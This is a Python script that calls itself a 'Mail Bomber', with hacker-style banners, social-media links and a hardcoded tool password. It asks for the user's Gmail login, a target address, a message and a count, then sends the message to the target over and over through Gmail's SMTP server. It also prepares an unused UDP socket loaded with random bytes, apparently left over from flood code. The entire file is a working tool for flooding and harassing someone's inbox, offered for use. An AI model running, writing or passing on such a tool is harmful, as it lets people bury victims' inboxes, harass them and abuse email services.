#!/usr/bin/python
#Coded By D1ARK-VA4U3
#A Product Of D1ARK-VA4U3
#Don't try to edit or modify this tool
import smtplib
import sys
import os  
import time
import socket
import random


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############


os.system("clear")
time.sleep(2)
print ("\033[31m")
psb("\n\n[!] Loading.....")
time.sleep(2)
psb("\n[!] Please Wait.....")
time.sleep(2.7)


os.system("clear")
print("""


██████╗░░█████╗░██████╗░██╗░░██╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
██║░░██║███████║██████╔╝█████═╝░
██║░░██║██╔══██║██╔══██╗██╔═██╗░
██████╔╝██║░░██║██║░░██║██║░╚██╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝

██╗░░░██╗░█████╗░██╗░░░██╗
██║░░░██║██╔══██╗██║░░░██║
╚██╗░██╔╝███████║██║░░░██║
░╚████╔╝░██╔══██║██║░░░██║
░░╚██╔╝░░██║░░██║╚██████╔╝
░░░╚═╝░░░╚═╝░░╚═╝░╚═════╝░

		🎉 WELCOME TO D1ARK-VA4U3 🎉
""")
print ("\033[31m")
print("#------------------------------------------------#")
time.sleep(3)

#### LOGIN ####
print ("\033[33m")
psb("      [!] ENTER TOOL USERNAME & PASSWORD [!]")
time.sleep(2)

usern="Darkvau"
passwd="king"

inpuser=str(input("\n =~> Tool UserName : "))
inppass=str(input(" =~>Tool Password : "))
time.sleep(2)

if usern==inpuser and passwd==inppass:
	print("\n [✔️]User & Pass Correct")
	pass
else:
	print("[❌] Wrong User & Pass!")
	sys.exit()
time.sleep(3)

psb ("\n    	  [✔️] LOGIN Successfully [✔️] ")

time.sleep(4)
os.system("clear")
#### BOMBING ####

time.sleep(4)
print ("\033[35m")
psb("\n\n[!] Loading.....")
time.sleep(3)
psb("\n[!] Please Wait.....")
time.sleep(2.50)


os.system("clear")
print("""

.%%...%%...%%%%...%%%%%%..%%.....                
.%%%.%%%..%%..%%....%%....%%.....                
.%%.%.%%..%%%%%%....%%....%%.....                
.%%...%%..%%..%%....%%....%%.....                
.%%...%%..%%..%%..%%%%%%..%%%%%%.                
.................................                
.%%%%%....%%%%...%%...%%..%%%%%...%%%%%%..%%%%%..
.%%..%%..%%..%%..%%%.%%%..%%..%%..%%......%%..%%.
.%%%%%...%%..%%..%%.%.%%..%%%%%...%%%%....%%%%%..
.%%..%%..%%..%%..%%...%%..%%..%%..%%......%%..%%.
.%%%%%....%%%%...%%...%%..%%%%%...%%%%%%..%%..%%.
.................................................

#------------------------------------------------#
#  		     Mail Bomber           	 #
#             CODED BY : D1ARK-VA4U3             #
#------------------------------------------------#
#  Github  : https://github.com/D1ARK-VA4U3/     #
# Facebook: https://www.facebook.com/Arif.vau143 #
#  Telegram : https://t.me/D1arkva4u3 	 #
#------------------------------------------------#
#               【﻿ 🅸🆃🆂 🅳1🅰🆁🅺-🆅🅰4🆄3】 	 	 #
#------------------------------------------------#


""")
time.sleep(3)

print ("\033[32m")
psb("       .....LOGIN YOUR GMAIL ACCOUNT.....")

devil=smtplib.SMTP('smtp.gmail.com','587')

devil.ehlo()
devil.starttls()

email=str(input("\n Enter Your Gmail : "))
pwd=str(input ("Enter Your Password : "))



time.sleep(2)
os.system("clear")
print ("\033[36m")
print("""

.%%...%%...%%%%...%%%%%%..%%.....                
.%%%.%%%..%%..%%....%%....%%.....                
.%%.%.%%..%%%%%%....%%....%%.....                
.%%...%%..%%..%%....%%....%%.....                
.%%...%%..%%..%%..%%%%%%..%%%%%%.                
.................................                
.%%%%%....%%%%...%%...%%..%%%%%...%%%%%%..%%%%%..
.%%..%%..%%..%%..%%%.%%%..%%..%%..%%......%%..%%.
.%%%%%...%%..%%..%%.%.%%..%%%%%...%%%%....%%%%%..
.%%..%%..%%..%%..%%...%%..%%..%%..%%......%%..%%.
.%%%%%....%%%%...%%...%%..%%%%%...%%%%%%..%%..%%.
.................................................

#------------------------------------------------#
#  		     Mail Bomber           	 #
#             CODED BY : D1ARK-VA4U3             #
#------------------------------------------------#
#  Github  : https://github.com/D1ARK-VA4U3     #
# Facebook: https://www.facebook.com/Arif.vau143 #
#  Telegram : https://t.me/D1arkva4u3	 #
#------------------------------------------------#
#               【﻿ 🅸🆃🆂 🅳1🅰🆁🅺-🆅🅰4🆄3 】 	 	 #
#------------------------------------------------#


""")
time.sleep(3)

tmail=str(input("\n Enter Your Target E-mail : "))
msg=str(input("Enter Your Message : "))
amount=int(input("Enter Your Amount : "))

devil.login(email,pwd)

for i in range(amount):
	devil.sendmail(email,tmail,msg)
	print(str(i+1)+" : Mail Send Succses")
time.sleep(2)

print ("\033[32m")
psb("         [✔️] Mail Bombing Successfully [✔️]")
